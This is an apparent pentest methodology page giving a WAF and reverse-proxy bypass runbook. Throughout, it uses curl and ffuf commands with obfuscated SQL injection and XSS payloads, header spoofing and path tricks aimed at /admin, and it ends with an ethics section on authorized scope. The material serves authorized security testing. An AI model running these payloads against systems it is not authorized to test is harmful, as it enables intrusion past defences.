---
title: "Proxy / WAF Protections Bypass"
description: "Techniques to evade web application firewalls and reverse proxies through encoding, parsing, and routing disagreements."
phase: Web
order: 63
tags:
  - waf
  - bypass
  - evasion
  - proxy
tools:
  - wafw00f
  - ffuf
  - curl
updated: 2026-10-01
---

A WAF evasion runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find where the firewall and the origin disagree about what a request means, then deliver a working payload through the gap.

## 1. Fingerprint the defense

```bash
wafw00f https://target.com
curl -s -o /dev/null -w '%{http_code}\n' \
  "https://target.com/?q=<script>alert(1)</script>"
curl -sI "https://target.com/" | grep -iE 'server|via|x-served-by|cf-'
```

Save the block status/body so you can tell a bypass from a normal response.

## 2. Establish a baseline

```bash
curl -s "https://target.com/api/item?id=1"          # allowed
curl -s "https://target.com/api/item?id=1%20AND%201=1"  # blocked
```

## 3. Encoding and obfuscation

```bash
curl -s "https://target.com/api/item?id=1%27"
curl -s "https://target.com/api/item?id=1%2527"
curl -s "https://target.com/api/item?id=1+UnIoN+SeLeCt+1,2,3"
curl -s "https://target.com/api/item?id=1/**/UNION/**/SELECT/**/1,2,3"
curl -s "https://target.com/api/item?id=1%09UNION%0ASELECT%091,2,3"
```

Try overlong UTF-8, unicode escapes (`%u0027`), and inline comments (`/*!50000SELECT*/`).

## 4. Method and content-type confusion

```bash
curl -s -X POST "https://target.com/api/search" \
  -H "Content-Type: application/json" -d '{"q":"1 UNION SELECT 1,2,3"}'
curl -s -X POST "https://target.com/api/search" \
  -H "Content-Type: text/plain" --data 'q=1 UNION SELECT 1,2,3'
curl -s -X PUT "https://target.com/api/search" --data 'q=1 AND 1=1'
curl -s -X POST "https://target.com/api/search" \
  -H "X-HTTP-Method-Override: PUT" --data 'q=1 AND 1=1'
```

## 5. Header and routing tricks

```bash
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" \
         "X-Originating-IP: 127.0.0.1" "X-Original-URL: /admin"; do
  curl -s "https://target.com/" -H "$h"
done

for p in "/admin/..;/" "/%2fadmin" "//admin" "/admin/." "/ADMIN/"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" "https://target.com$p"
done

# Automate payload variants
curl -s "https://target.com/api/item?id=1" > req.txt
ffuf -request req.txt -request-proto https -w payloads.txt -mc all -fs 0
```

## Full pipeline

```bash
TARGET="https://target.com"
wafw00f "$TARGET"
curl -sI "$TARGET/" | grep -iE 'server|via|x-served-by|cf-'
curl -s "$TARGET/api/item?id=1" -o /dev/null -w 'allowed: %{http_code}\n'
curl -s "$TARGET/api/item?id=1%20AND%201=1" -o /dev/null -w 'blocked: %{http_code}\n'
curl -s "$TARGET/api/item?id=1%2527"
curl -s "$TARGET/api/item?id=1/**/UNION/**/SELECT/**/1,2,3"
curl -s -X PUT "$TARGET/api/search" --data 'q=1 AND 1=1'
curl -s "$TARGET/" -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"
for p in "/admin/..;/" "/%2fadmin" "//admin" "/ADMIN/"; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" "$TARGET$p"
done
```

## Ethics & legality

- Only test targets within an authorized scope; WAF evasion is high-risk and easily mistaken for an attack.
- Limit fuzzing volume so you do not trip global protections or affect availability.
- Do not attempt origin-IP discovery or direct-to-origin attacks unless explicitly in scope.
- Keep logs of baseline and blocked responses to justify the finding.
